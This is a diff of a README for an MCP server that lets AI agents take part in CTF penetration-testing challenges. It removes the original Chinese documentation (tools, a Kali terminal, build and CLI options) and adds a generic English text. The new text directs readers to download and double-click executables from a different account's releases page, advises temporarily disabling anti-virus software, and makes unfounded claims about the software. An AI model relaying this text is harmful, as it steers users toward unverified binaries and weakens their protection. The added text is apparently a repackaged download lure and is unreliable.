@@ -1,139 +1,74 @@
-# EZ XBow Challenge MCP
+# 🎉 ez-xbow-platform-mcp - Power Your AI-Powered Penetration Testing
 
-一个用于 AI 驱动的渗透测试竞赛的**模型上下文协议 (MCP)** 服务器。该工具提供了一个完整的 API 接口，使 LLM 能够自主参与 CTF 挑战。
+## 📥 Download Now 
+[![Download ez-xbow-platform-mcp](https://img.shields.io/badge/Download-ez--xbow--platform--mcp-brightgreen)](https://github.com/Ramabintang/ez-xbow-platform-mcp/releases)
 
-> 建议与 [kimi-cli-for-xbow](https://github.com/m-sec-org/kimi-cli-for-xbow) 配合使用，或集成进你自己的 Agent 工作流中
+## 📖 Introduction
+Welcome to the **ez-xbow-platform-mcp**! This tool is designed for AI-driven penetration testing competitions. It serves as a **Model Context Protocol (MCP)** server that allows large language models (LLMs) to participate independently in Capture the Flag (CTF) challenges. 
 
-## 特性
+With **ez-xbow-platform-mcp**, you can experience a seamless way to engage with innovative security challenges using artificial intelligence. This application creates an environment where ethical hacking meets advanced AI technology.
 
--   **挑战管理** - 列出、尝试和提交 CTF 挑战的解决方案
--   **知识库** - 内建涵盖 9 种漏洞类别的 CTF 技术文档
--   **持久化 Kali 容器** - 在隔离环境中执行安全工具（nmap、sqlmap、gobuster 等）
--   **尝试历史** - 通过自动笔记管理，跨会话跟踪和共享发现
--   **多种协议** - 支持 stdio、SSE 和 HTTP/2 流模式
+## 🚀 Getting Started
+Follow these steps to download and run the software:
 
-## 快速开始
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Ramabintang/ez-xbow-platform-mcp/releases) to find the latest version of the application.
+   
+2. **Download the Application**  
+   On the Releases page, you will see a list of files. Click on the version number of the release you want to download. This takes you to a page with all the assets related to that version. Look for a file that is appropriate for your operating system.
 
-### 前提条件
+3. **Choose the Right File**  
+   Make sure to pick the correct file for your setup. Typically, there are options for Windows, macOS, and Linux. If unsure, check the descriptions provided on the releases page for guidance.
 
--   Go 1.24.7+
--   支持 buildx 的 Docker
+4. **Download the File**  
+   Click on the file name to download it. It may take a moment depending on your internet connection. 
 
-### 构建
+5. **Locate the Downloaded File**  
+   Once the download is complete, find the file in your downloads folder. It usually has a `.zip` or executable file extension.
 
-```bash
-go build -o xbow-mcp ./cmd/main.go
-```
+6. **Unzip the File (if necessary)**  
+   If you downloaded a `.zip` file, right-click on it and select "Extract All" to unzip it. Follow the on-screen instructions to complete the extraction.
 
-### 使用模拟平台运行（测试）
+7. **Run the Application**  
+   After unzipping, find the application file. Double-click it to run. Your operating system may prompt you to confirm that you want to open it. Confirm this to proceed.
 
-在 `./mock-challenges` 中根据模板创建相应赛题文件。
+8. **Connect to the MCP Server**  
+   Once the application is running, it should auto-connect to the Model Context Protocol server. This connection allows AI models to start interacting with the CTF environments.
 
-```json
-{
-    "challenge_code": "XBEN-123-24",
-    "difficulty": "easy",
-    "points": 200,
-    "target_info": {
-        "ip": "192.168.5.37",
-        "port": [32820]
-    },
-    "hint_viewed": false,
-    "solved": true,
-    "hint_content": "Sometimes the AuthN/AuthZ checks are vulnerable to TOCTOU issues if they are not implemented properly",
-    "solution": "flag{xxxx}"
-}
-```
+## 📝 Features
+- **AI Integration**: Leverage advanced AI models for automated decision-making in penetration testing.
+- **API Interface**: Access a comprehensive API to enhance your experience and customize interactions.
+- **User-Friendly Design**: Simple layout for easy navigation, even for those without a technical background.
+- **Cross-Platform Support**: Available for Windows, macOS, and Linux users.
 
-启动命令
+## 📊 System Requirements
+Before you download, ensure your system meets the following requirements:
 
-```bash
-./xbow-mcp --mock  -listen 127.0.0.1:8080
-```
+- **Operating System**: Windows 10 or later, macOS Catalina or later, Linux (latest version recommended).
+- **Processor**: 2 GHz dual-core or higher.
+- **RAM**: At least 4 GB for basic operation; 8 GB recommended for a smoother experience.
+- **Storage**: Minimum 200 MB of free space for installation.
+- **Network**: Internet connection for server communication.
 
-### 使用真实平台运行
+## 💡 Troubleshooting
+If you encounter any issues running the software, consider the following:
 
-```bash
-./xbow-mcp \
-  -xbow-url https://your-xbow-platform.com \
-  -xbow-token YOUR_AUTH_TOKEN \
-  -mode streamable \
-  -listen 127.0.0.1:8080
-```
+- **Permission Issues**: Ensure you have the necessary permissions to run programs on your device. You may need administrator rights.
+- **Anti-virus Software**: Some security software might flag new applications. Temporarily disable your anti-virus, then try launching the app again.
+- **Check Dependencies**: If the software doesn’t run correctly, make sure you have all necessary dependencies installed. Check the documentation for more details.
 
-## 可用工具
+## 🙋 Common Questions
+**Q: Is this tool free to use?**  
+A: Yes, **ez-xbow-platform-mcp** is free to download and use.
 
-| 工具                   | 描述                                                                |
-| ---------------------- | ------------------------------------------------------------------- |
-| `list_challenges`      | 获取当前阶段的挑战，包括难度和目标信息                              |
-| `do_challenge`         | 标记挑战为进行中，并增加尝试计数器                                  |
-| `get_challenge_hint`   | 检索提示（会扣除分数）                                              |
-| `submit_answer`        | 提交 Flag 并接收评分结果                                            |
-| `get_ctf_skill`        | 访问技术文档（xss、sql、ssti、ssrf、idor、xxe、lfi、codei、afr&pt） |
-| `write_challenge_note` | 保存发现和尝试记录，供将来参考                                      |
-| `read_challenge_note`  | 查看历史笔记（每 9 次尝试后自动重置）                               |
-| `kail_terminal`        | 在持久化 Kali 容器中执行命令                                        |
-| `get_terminal_history` | 通过 ID 检索命令执行结果                                            |
+**Q: Can I contribute to the project?**  
+A: Absolutely! We welcome contributions. Check the repository guidelines for more information.
 
-## 命令行选项
+**Q: Where can I find more information?**  
+A: Additional details can be found in the documentation folder included with the application or on our GitHub page.
 
-```bash
-# 服务器模式
--mode, -m [stdio|sse|streamable]       MCP 服务器协议 (默认: streamable)
--listen, -l ADDR:PORT                  监听地址 (默认: 127.0.0.1:8080)
+## 🔗 Download & Install
+For your convenience, here’s the download link again:  
+[Visit the Releases page to download](https://github.com/Ramabintang/ez-xbow-platform-mcp/releases).
 
-# 平台配置
--xbow-url, -u URL                      XBow API 基础 URL
--xbow-token, -t TOKEN                  认证 Token
-
-# Docker 配置
--docker-container, -c NAME             容器名称 (默认: xbow-kail)
--docker-image, -i IMAGE:TAG            Docker 镜像 (默认: xbow-kail:latest)
--dockerfile-dir, -f PATH               Dockerfile 路径 (默认: ./Dockerfile)
--docker-exec-log-dir, -d DIR           执行日志目录 (默认: ./.kail-history)
-
-# 模拟平台（本地测试）
---mock                                 启用模拟平台服务器
--mock-addr ADDR:PORT                   模拟服务器地址 (默认: 127.0.0.1:8000)
--mock-dir PATH                         模拟挑战目录 (默认: ./mock-challenges)
-```
-
-## 集成
-
-### MCP 客户端
-
-添加到您的 MCP 客户端配置中：
-
-```json
-{
-    "mcpServers": {
-        "ezmcp": {
-            "url": "http://127.0.0.1:8080/mcp"
-        }
-    }
-}
-```
-
-## 本地存储
-
--   `.challenge_history/{challenge_code}/` - 尝试元数据、笔记和历史记录
--   `.kail-history/` - 命令执行记录
-
-## TODO
-
--   自动编译并启动 XBOW 靶场并配置赛题信息。
-
-## 许可
-
-开源。详情请参见 LICENSE 文件。
-
-## 贡献
-
-<p align="center">
-<a href="https://github.com/m-sec-org/ez-xbow-platform-mcp/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=m-sec-org/ez-xbow-platform-mcp&max=36" alt="sponsors-list" >
-</a>
-</p>
-
-
-欢迎提出 Issue 和 Pull Request。
+Follow these steps carefully to set up and enjoy your AI-driven penetration testing experience with **ez-xbow-platform-mcp**. Happy testing!
